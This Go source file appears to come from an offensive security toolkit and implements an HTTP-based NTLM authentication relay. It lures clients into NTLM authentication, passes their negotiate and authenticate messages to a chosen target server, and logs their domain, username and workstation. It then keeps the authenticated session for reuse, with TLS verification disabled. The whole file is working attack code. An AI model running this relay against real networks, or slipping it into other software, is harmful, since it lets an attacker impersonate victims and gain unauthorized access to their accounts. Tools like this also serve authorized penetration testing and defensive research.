package gopRelay

import (
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httputil"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/hophouse/gop/authentication/ntlm"
	gopproxy "github.com/hophouse/gop/gopProxy"
	"github.com/hophouse/gop/utils/logger"
)

func RunHTTPServer(serverAddr string, ProcessIncomingConnChan chan incomingConn) {
	serverAddrTCP4, err := net.ResolveTCPAddr("tcp", serverAddr)
	if err != nil {
		logger.Fatal(err)
	}

	logger.Printf("[+] Run server on : http://%s\n", serverAddrTCP4.String())

	l, err := net.ListenTCP("tcp4", serverAddrTCP4)
	if err != nil {
		logger.Fatal(err)
	}
	defer l.Close()

	for {
		conn, err := l.AcceptTCP()
		if err != nil {
			logger.Println(err)
			break
		}
		defer conn.Close()

		ProcessIncomingConnChan <- incomingConn{
			f:    HandleHTTPServer,
			conn: conn,
		}
	}
}

func HandleHTTPServer(n *NTLMAuthHTTPRelay, conn *net.TCPConn, target string) error {
	n.ClientConnUUID = "HTTP-" + n.ClientConnUUID

	err := conn.SetKeepAlive(true)
	if err != nil {
		logger.Println(err)
		return err
	}

	err = conn.SetKeepAlivePeriod(30 * time.Second)
	if err != nil {
		logger.Printf("Unable to set keepalive interval - %s", err)
	}

	err = n.ProcessHTTPServer(target)
	if err != nil {
		logger.Printf("Error whil processing targets: %s\n", err)
		return err
	}

	return nil
}

func (n *NTLMAuthHTTPRelay) ProcessHTTPServer(target string) error {
	n.mu.Lock()
	defer n.mu.Unlock()

	targetURLSanitized := strings.Replace(
		strings.Replace(
			strings.Replace(
				strings.Replace(target, "?", "", -1),
				"#", "", -1),
			":", "", -1),
		"/", "", -1)

	currentRelay := Relay{
		relayUUID:            "HTTP-" + strings.Split(uuid.NewString(), "-")[0],
		parentClientConnUUID: n.ClientConnUUID,
		target:               target,
		mu:                   &sync.Mutex{},
	}
	currentRelay.filename = fmt.Sprintf("%s-%s-%s-%s.html", time.Now().Format("20060102-150405"), n.ClientConnUUID, currentRelay.relayUUID, targetURLSanitized)

	// proxyURL, _ := url.Parse("http://127.0.0.1:8888")
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		// Proxy:           http.ProxyURL(proxyURL),
	}
	currentRelay.conn = &http.Client{Transport: tr}

	for {
		clientRequest, err := http.ReadRequest(n.Reader)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return err
		}

		clientRequestDump, err := httputil.DumpRequest(clientRequest, true)
		if err != nil {
			logger.Fprintln(logger.Writer(), err)
			return err
		}
		io.Copy(io.Discard, clientRequest.Body)
		clientRequest.Body.Close()

		for _, line := range strings.Split(string(clientRequestDump), "\n") {
			logger.Fprintf(logger.Writer(), "%s | client -> gop | %s\n", n.ClientConnUUID, line)
		}
		logger.Fprint(logger.Writer(), "\n")

		clientAuthorizationHeader := clientRequest.Header.Get("Authorization")

		// Send WWW-Authenticate: NTLM header if not present
		if clientAuthorizationHeader == "" {
			// TCP Connexion will be closed by the client and a new TCP connexion will be received
			n.step = "Authentication"
			err := n.initiateWWWAuthenticate()
			if err != nil {
				logger.Fprintln(logger.Writer(), err)
				return err
			}
			return nil
		}

		clientAuthorization := clientRequest.Header.Get("Authorization")

		authorization_bytes, err := base64.StdEncoding.DecodeString(clientAuthorization[5:])
		if err != nil {
			err := fmt.Errorf("decode error authorization header : %s", clientAuthorization)
			logger.Panicln(err)
			continue
			// return err
		}
		msgType := binary.LittleEndian.Uint32(authorization_bytes[8:12])

		logger.Fprintf(logger.Writer(), "%s | %s | [+] Message type : %d\n", n.ClientConnUUID, currentRelay.relayUUID, msgType)

		/*
		 * Message Type 1
		 */

		// Received Negociate message. Handle it and answer with a Challenge message

		if msgType == uint32(1) {
			// Client Negotiate
			serverNegociateRequest := ntlm.NTLMSSP_NEGOTIATE{}
			serverNegociateRequest.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM NEGOCIATE\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(serverNegociateRequest.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			/*
			 *
			 * Client part
			 *
			 */

			clientNegotiateRequest := gopproxy.CopyRequest(clientRequest)
			clientNegotiateRequest.URL, err = url.Parse(currentRelay.target)
			if err != nil {
				logger.Println(err)
				return err
			}

			logger.Println(clientNegotiateRequest)
			logger.Printf("%#v\n", &clientNegotiateRequest)

			clientNegotiateResponse, err := currentRelay.SendRequestGetResponse(clientNegotiateRequest, "gop", "target")
			if err != nil {
				logger.Println(err)
				return err
			}

			authorization := clientNegotiateResponse.Header.Get("Www-Authenticate")

			if clientNegotiateResponse.StatusCode != 401 {
				err := fmt.Errorf("client respond with a %s code", clientNegotiateResponse.Status)
				logger.Fprintf(logger.Writer(), "%s | %s | Error       : %s\n", n.ClientConnUUID, currentRelay.relayUUID, err)
				currentRelay.conn.CloseIdleConnections()
				return err
			}

			authorization_bytes, err = base64.StdEncoding.DecodeString(authorization[5:])
			if err != nil {
				err := fmt.Errorf("decode error authorization header : %s", authorization)
				return err
			}

			clientChallengeNTLM := ntlm.NTLMSSP_CHALLENGE{}
			clientChallengeNTLM.Read(authorization_bytes)

			logger.Fprintf(logger.Writer(), "%s | %s | gop :: target | [+] Client Challenge\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(clientChallengeNTLM.ToString(), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | %s | gop :: target | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			/*
			 *
			 * End client part
			 *
			 */
			clientNegotiateResponseDump, err := httputil.DumpResponse(clientNegotiateResponse, true)
			if err != nil {
				logger.Println(err)
				continue
				// return err
			}

			n.clientConn.Write(clientNegotiateResponseDump)
			for _, line := range strings.Split(string(clientNegotiateResponseDump), "\n") {
				logger.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Sent server challenge to client\n", n.ClientConnUUID, currentRelay.relayUUID)

			continue
		}

		/*
		 * End Message Type 1
		 */

		// Retrieve information into the Authentication message
		/*
		 * Message Type 3
		 */
		if msgType == uint32(3) {
			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server received Authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)

			serverAuthenticate := ntlm.NTLMSSP_AUTH{}
			serverAuthenticate.Read(authorization_bytes)

			currentRelay.Domain = string(serverAuthenticate.TargetName.RawData)
			currentRelay.Username = string(serverAuthenticate.Username.RawData)
			currentRelay.Workstation = string(serverAuthenticate.Workstation.RawData)

			logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] Server authenticate\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(serverAuthenticate.ToString(), "\n") {
				logger.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			// Prepare final response to the client
			ntlmv2Response := ntlm.NTLMv2Response{}
			ntlmv2Response.Read(serverAuthenticate.NTLMv2Response.RawData)

			fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | [+] NTLM AUTHENTICATE RESPONSE:\n", n.ClientConnUUID, currentRelay.relayUUID)
			for _, line := range strings.Split(string(ntlmv2Response.ToString()), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | %s | client :: gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}

			/*
			 *
			 * Client part
			 *
			 */
			clientAuthRequest, _ := http.NewRequest("GET", target, nil)
			gopproxy.CopyHeader(clientAuthRequest.Header, clientRequest.Header)
			clientAuthResponse, err := currentRelay.SendRequestGetResponse(clientAuthRequest, "gop", "target")
			if err != nil {
				logger.Println(err)
				continue
				// return err
			}

			if clientAuthResponse.StatusCode == 401 {
				return fmt.Errorf("could not authenticate to the endpoint")
			}

			currentRelay.AuthorizationHeader = clientRequest.Header.Get("Authorization")

			/*
			 *
			 * End client part
			 *
			 */

			randomPath := uuid.NewString()
			clientInitialResponseByte := []byte(
				"HTTP/1.1 307 Temporary Redirect\n" +
					"Location: /" + randomPath + " \n" +
					// "WWW-Authenticate: NTLM\n" +
					// "WWW-Authenticate: Negociate\n" +
					"Connection: keep-alive\n" +
					"Content-Length: 0\n" +
					"\n\n")

			// clientInitialResponseByte := []byte(
			// 	"HTTP/1.1 200 OK\n" +
			// 		"WWW-Authenticate: NTLM\n" +
			// 		"WWW-Authenticate: Negociate\n" +
			// 		"Connection: keep-alive\n" +
			// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
			// 		"Content-Length: 0\n" +
			// 		"\n\n\n")

			n.clientConn.Write(clientInitialResponseByte)
			for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
				fmt.Fprintf(logger.Writer(), "%s | %s | client <- gop | %s\n", n.ClientConnUUID, currentRelay.relayUUID, line)
			}
			logger.Fprint(logger.Writer(), "\n")

			// clientWWWAuthenticateResponseByte := []byte(
			// 	"HTTP/1.1 401 Unauthorized\n" +
			// 		"WWW-Authenticate: NTLM\n" +
			// 		"WWW-Authenticate: Negociate\n" +
			// 		"Connection: keep-alive\n" +
			// 		"Keep-Alive: timeout=8888888888888888, max=88888888" +
			// 		"Content-Length: 0\n" +
			// 		"\n\n\n")

			break
		}
		/*
		 * End Message Type 3
		 */

	}

	n.Relays[currentRelay.target] = &currentRelay

	return nil
}

func (n *NTLMAuthHTTPRelay) initiateWWWAuthenticate() error {

	clientInitialResponseByte := []byte(
		"HTTP/1.1 401 Unauthorized\n" +
			"WWW-Authenticate: NTLM\n" +
			"WWW-Authenticate: Negociate\n" +
			"Connection: keep-alive\n" +
			"Content-Length: 0\n" +
			"\n\n")

	_, err := n.clientConn.Write(clientInitialResponseByte)
	if err != nil {
		logger.Println(err)
		return nil
	}

	for _, line := range strings.Split(string(clientInitialResponseByte), "\n") {
		fmt.Fprintf(logger.Writer(), "%s | client <- gop | %s\n", n.ClientConnUUID, line)
	}
	logger.Fprint(logger.Writer(), "\n")

	return nil
}
